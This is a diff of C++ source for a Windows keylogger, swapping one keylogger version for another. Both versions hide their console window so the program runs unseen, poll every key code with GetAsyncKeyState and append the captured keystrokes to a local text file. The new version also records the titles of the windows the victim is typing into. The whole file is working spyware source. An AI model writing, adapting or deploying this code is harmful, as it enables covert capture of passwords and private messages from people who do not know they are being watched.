@@ -1,81 +1,100 @@
-//Simples keylogger não desenvolvido por mim :)
+#include <fstream>
+#include <Windows.h>
+#include <stdio.h>
+#pragma comment(lib, "Ws2_32.lib")
 
-#include<iostream>
-#include<stdio.h>
-#include <windows.h>
-#include<winuser.h>
+using namespace std;
 
- using namespace std;
-
- int save(int key_stroke, char *file);
-void Stealth();
-
-
-int main(){
-
-     Stealth();
-     char i;
-
-     while(1){
-        for (int i=8;i<=190 ;i++ ){
-            if(GetAsyncKeyState(i) == -32767)
-                save(i,"LOG.TXT");
-        }
-        Sleep( 50 );
-     }
-     system("PAUSE");
- return 0;
- }
-
- void Stealth()
+// write text to file
+void writeData(string text)
 {
- HWND Stealth;
- AllocConsole();
- Stealth = FindWindowA("ConsoleWindowClass", NULL);
- ShowWindow(Stealth,0);
+	ofstream file;
+	file.open("Keylogs.txt", fstream::app);
+	file << text;
+	file.close();
 }
 
-int save(int key_stroke, char *file)
- {
-     if( (key_stroke==1)||(key_stroke==2) )
-     return 0;
-      FILE  *OUTPUT_FILE;
-     OUTPUT_FILE = fopen (file,"a+");
-    // fprintf(OUTPUT_FILE,"%s",&key_stroke);
+// hides the keylogger so that it isn't visible
+void stealth()
+{
+	HWND hwnd;
+	AllocConsole();
+	hwnd = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(hwnd, 0);
+}
 
-    // cout<<key_stroke<<endl;
-     if(key_stroke==8)
-     fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
-    else if(key_stroke==13)
-     fprintf(OUTPUT_FILE, "%s", "\n");
-     else if(key_stroke==32)
-     fprintf(OUTPUT_FILE, "%s", " ");
-    else if(key_stroke==VK_TAB)
-     fprintf(OUTPUT_FILE, "%s", "[TAB]");
-     else if(key_stroke==VK_SHIFT)
-     fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
-    else if(key_stroke==VK_CONTROL)
-     fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
-    else if(key_stroke==VK_ESCAPE)
-     fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
-    else if(key_stroke==VK_END)
-     fprintf(OUTPUT_FILE, "%s", "[END]");
-     else if(key_stroke==VK_HOME)
-     fprintf(OUTPUT_FILE, "%s", "[HOME]");
-     else if(key_stroke==VK_LEFT)
-     fprintf(OUTPUT_FILE, "%s", "[LEFT]");
-     else if(key_stroke==VK_RIGHT)
-     fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
-     else if(key_stroke==VK_UP)
-     fprintf(OUTPUT_FILE, "%s", "[UP]");
-     else if(key_stroke==VK_DOWN)
-     fprintf(OUTPUT_FILE, "%s", "[DOWN]");
-     else if(key_stroke== 190 || key_stroke== 110 )
-     fprintf(OUTPUT_FILE, "%s", ".");
-     else
-     fprintf(OUTPUT_FILE,"%s",&key_stroke);
+// this method is to write to the file the special cases of keyboard inputs
+bool isKeyListed(int vKey) 
+{
+	switch (vKey) 
+	{
+	case VK_RETURN:
+		writeData("\n");
+		break;
+	case VK_BACK:
+		writeData(" [BACKSPACE] ");
+		break;
+	case VK_SPACE:
+		writeData(" ");
+		break;
+	case VK_SHIFT:
+		writeData(" [SHIFT] ");
+		break;
+	case VK_OEM_PERIOD:
+		writeData(".");
+		break;
+	default: return false;
+	}
+	return 0;
+}
 
+int main()
+{
+	stealth();  // hides application
+	char Key;
+	string test = "";
+	
+	while (1) 
+	{
+		for (Key = 8; Key <= 255; Key++)
+		{
+			if (GetAsyncKeyState(Key) == -32767) 
+			{
+				if (isKeyListed(Key) == 0)
+				{
+					// initialize ofstream object
+					ofstream LogFile;
+					LogFile.open("Keylogs.txt", fstream::app);
+					// writes the character to the text file
+					LogFile << Key;
+					// close stream
+					LogFile.close();
+				}
+			}
+			// gets the window information
+			char name[200];
+			memset(name, 0, sizeof(name));
+			GetWindowText(GetForegroundWindow(), name, sizeof(name));
+			// store information as string
+			string str(name);
+			// if same, don't write, else write 
+			// this prevents the same info repeated twice in a row
+			if (test.compare(str) != 0)
+			{
+				// initializae ofstream object
+				ofstream file;
+				file.open("Keylogs.txt", fstream::app);
+				// change test so that it prevents same info being written
+				test = str;
+				// text that will be written on the file
+				string title = "\nActive Window Title: " + str + "\n";
+				// writes string onto file
+				file << title;
+				// close stream
+				file.close();
+			}
 
-     fclose(OUTPUT_FILE);
-     return 0;
- }
+		}
+		
+	}
+}
